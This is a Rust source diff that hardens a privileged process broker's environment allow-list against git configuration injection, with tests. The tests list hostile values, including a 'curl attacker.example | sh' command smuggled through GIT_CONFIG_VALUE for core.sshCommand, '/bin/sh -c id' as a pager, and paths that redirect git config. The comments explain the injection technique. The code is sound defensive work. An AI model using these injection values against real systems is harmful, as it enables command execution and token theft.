@@ -39,6 +39,27 @@
 //! before `execve`, and while `no_new_privs` and the glibc secure-execution
 //! rules already neutralise them there, keeping them off the list means the
 //! boundary does not *depend* on that reasoning.
+//!
+//! Every `GIT_CONFIG_*` variable is absent for a stronger reason:
+//! `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` sets **arbitrary** git configuration,
+//! and `core.sshCommand`, `core.pager`, `core.editor`, `diff.external`,
+//! `filter.<x>.clean` and `credential.helper` are all arbitrary command
+//! execution. A key-name allow-list is no defence at all here, because
+//! `GIT_CONFIG_KEY_0` is the allowed *name* whose *value* names the dangerous
+//! key. `GIT_CONFIG_NOSYSTEM` is absent too, and that is load-bearing rather
+//! than tidy: measured, it makes git ignore the trust anchor below and restores
+//! the exact production failure.
+//!
+//! # The one git variable the launcher DOES set
+//!
+//! The brokered child needs `safe.directory` or every `git` command in the
+//! worker-owned workspace fails "dubious ownership". That arrives as
+//! [`crate::git_trust`]'s launcher-written config **file**, exported as
+//! `GIT_CONFIG_SYSTEM` — derived by the launcher and overridden on every spawn,
+//! exactly like the parallelism pins, and admitted by [`is_allowed_environment_entry`]
+//! only when its value is byte-identical to the launcher's own anchor path.
+
+pub use crate::git_trust::GIT_TRUST_ANCHOR_KEY;
 
 /// Exact environment keys the broker forwards to a launched child.
 ///
@@ -138,6 +159,48 @@ pub fn is_allowed_environment_key(key: &str) -> bool {
         || ALLOWED_PREFIXES
             .iter()
             .any(|prefix| key.starts_with(prefix))
+}
+
+/// Is the `key=value` **entry** forwardable to a launched child?
+///
+/// This — not [`is_allowed_environment_key`] — is what `CommandSpec::validate`
+/// applies inside the privileged broker, because one entry cannot be judged by
+/// its key alone.
+///
+/// [`GIT_TRUST_ANCHOR_KEY`] names a git configuration *file*. Any file. Admitting
+/// it on the strength of its name would let a caller point the child's system
+/// git config at something it wrote — `core.sshCommand = <anything>` — which is
+/// arbitrary command execution across the boundary the broker exists to
+/// establish. So it is admitted only when the value is byte-identical to
+/// [`crate::git_trust::anchor_path`]: a path this process chose, in a directory
+/// this process owns and no other identity can write, holding contents this
+/// process wrote. A caller cannot name it usefully (the launcher overwrites the
+/// value on every spawn regardless) and cannot name anything else at all.
+///
+/// Every other key is judged by name, as before.
+pub fn is_allowed_environment_entry(key: &str, value: &str) -> bool {
+    if key == GIT_TRUST_ANCHOR_KEY {
+        return crate::git_trust::is_anchor_value(value);
+    }
+    is_allowed_environment_key(key)
+}
+
+/// Apply the launcher's git trust anchor over `environment`, replacing whatever
+/// the caller supplied for [`GIT_TRUST_ANCHOR_KEY`].
+///
+/// Same shape and the same reasoning as [`apply_parallelism_pins`]: a caller may
+/// legitimately carry the key (the pod renders git configuration), but the value
+/// the child sees is always the launcher's, because only the launcher knows —
+/// and owns — the file that is safe to point at.
+pub fn apply_git_trust_anchor(environment: &mut Vec<(String, String)>, anchor: &std::path::Path) {
+    let value = anchor.display().to_string();
+    match environment
+        .iter_mut()
+        .find(|(existing, _)| existing == GIT_TRUST_ANCHOR_KEY)
+    {
+        Some(slot) => slot.1 = value,
+        None => environment.push((GIT_TRUST_ANCHOR_KEY.to_owned(), value)),
+    }
 }
 
 /// Parallelism pin keys the launcher **overrides** on every spawn.
@@ -266,6 +329,99 @@ mod tests {
                 "{required} must reach a brokered build"
             );
         }
+    }
+
+    /// `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` is an arbitrary-config injection
+    /// primitive and several git keys are arbitrary command execution, so the
+    /// env form must stay shut — by key AND as a whole entry, since the
+    /// dangerous name travels in the *value*.
+    #[test]
+    fn the_git_config_injection_primitive_is_not_forwardable_in_any_form() {
+        for (key, value) in [
+            ("GIT_CONFIG_COUNT", "1"),
+            ("GIT_CONFIG_KEY_0", "safe.directory"),
+            ("GIT_CONFIG_KEY_0", "core.sshCommand"),
+            ("GIT_CONFIG_VALUE_0", "curl attacker.example | sh"),
+            ("GIT_CONFIG_KEY_12", "core.pager"),
+            ("GIT_CONFIG_VALUE_12", "/bin/sh -c id"),
+            // Would make git ignore the anchor entirely — measured, it restores
+            // the exact "dubious ownership" failure.
+            ("GIT_CONFIG_NOSYSTEM", "1"),
+            // Would redirect the read of `$HOME/.gitconfig`, where
+            // `configure_private_dep_access` stores the installation token.
+            ("GIT_CONFIG_GLOBAL", "/workspace/evil"),
+            ("GIT_CONFIG", "/workspace/evil"),
+            ("GIT_SSH_COMMAND", "/workspace/evil"),
+            ("GIT_PAGER", "/workspace/evil"),
+            ("GIT_EXTERNAL_DIFF", "/workspace/evil"),
+            ("GIT_ALTERNATE_OBJECT_DIRECTORIES", "/workspace/objects"),
+        ] {
+            assert!(
+                !is_allowed_environment_key(key),
+                "{key} must not be forwardable by name"
+            );
+            assert!(
+                !is_allowed_environment_entry(key, value),
+                "{key}={value} must not be forwardable as an entry"
+            );
+        }
+    }
+
+    /// The anchor key is admitted by VALUE, not by name: the launcher's own
+    /// path and nothing else.
+    #[test]
+    fn the_trust_anchor_key_admits_only_the_launchers_own_file() {
+        let anchor = crate::git_trust::anchor_path()
+            .expect("the anchor must materialize in a test environment")
+            .display()
+            .to_string();
+        assert!(is_allowed_environment_entry(GIT_TRUST_ANCHOR_KEY, &anchor));
+        assert!(
+            !is_allowed_environment_key(GIT_TRUST_ANCHOR_KEY),
+            "the anchor key must never be forwardable on its name alone; that is what \
+             would let a caller point the child's system config at a file it wrote"
+        );
+        for hostile in [
+            "/workspace/wt/.evil-gitconfig",
+            "/home/djinn/.gitconfig",
+            "/etc/gitconfig",
+            "",
+            // A path that merely starts with the anchor's own.
+            &format!("{anchor}-attacker"),
+        ] {
+            assert!(
+                !is_allowed_environment_entry(GIT_TRUST_ANCHOR_KEY, hostile),
+                "{hostile} must not pass as the launcher's trust anchor"
+            );
+        }
+    }
+
+    #[test]
+    fn the_trust_anchor_overrides_a_caller_supplied_value_and_keeps_position() {
+        let anchor = std::path::Path::new("/tmp/djinn-launcher-git-0/gitconfig");
+        let mut environment = vec![
+            ("PATH".to_owned(), "/usr/bin".to_owned()),
+            (
+                GIT_TRUST_ANCHOR_KEY.to_owned(),
+                "/workspace/evil".to_owned(),
+            ),
+            ("HOME".to_owned(), "/home/djinn".to_owned()),
+        ];
+        apply_git_trust_anchor(&mut environment, anchor);
+        assert_eq!(
+            environment[1],
+            (
+                GIT_TRUST_ANCHOR_KEY.to_owned(),
+                anchor.display().to_string()
+            ),
+            "a caller value must be overridden in place, never duplicated"
+        );
+        assert_eq!(environment.len(), 3);
+
+        let mut absent = vec![("PATH".to_owned(), "/usr/bin".to_owned())];
+        apply_git_trust_anchor(&mut absent, anchor);
+        assert_eq!(absent.len(), 2);
+        assert_eq!(absent[1].0, GIT_TRUST_ANCHOR_KEY);
     }
 
     #[test]
